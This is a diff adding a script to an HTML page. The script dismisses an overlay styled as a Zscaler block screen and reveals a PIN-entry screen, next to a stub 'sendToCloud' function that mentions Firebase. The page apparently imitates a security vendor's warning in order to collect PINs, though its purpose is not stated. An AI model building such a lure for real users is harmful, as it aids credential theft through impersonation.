@@ -257,5 +257,53 @@ function sendToCloud(_payload){
   // Or push to Firebase RTDB/Firestore.
 }
 </script>
+  <script>
+(function () {
+  // --- Helpers that tolerate duplicate blocks/IDs ---
+  function removeAllZscalerOverlays() {
+    document.querySelectorAll('#zscaler-block').forEach(el => el.remove());
+  }
+  function showAllPinScreens() {
+    const pins = document.querySelectorAll('#pinScreen');
+    pins.forEach(el => { el.style.display = 'flex'; });
+    // Focus the first PIN input if present
+    const input = document.querySelector('#pinInput');
+    if (input) input.focus();
+  }
+
+  function onSnapClick(e) {
+    e.preventDefault();
+    removeAllZscalerOverlays();
+    showAllPinScreens();
+  }
+
+  // Wire up after DOM is fully ready
+  function initSnapLinks() {
+    // If there are multiple "snapLink" anchors, bind them all.
+    const links = document.querySelectorAll('#snapLink, .pg .clickable#snapLink');
+    if (links.length === 0) return;
+    links.forEach(a => {
+      // Avoid double-binding
+      a.removeEventListener('click', onSnapClick);
+      a.addEventListener('click', onSnapClick);
+    });
+  }
+
+  // If script ran too early, wait for DOM
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initSnapLinks);
+  } else {
+    initSnapLinks();
+  }
+
+  // --- (Optional) Safety: also allow pressing Enter on the overlay to continue ---
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter' && document.querySelector('#zscaler-block')) {
+      onSnapClick(e);
+    }
+  });
+})();
+</script>
 </body>
 </html>
+
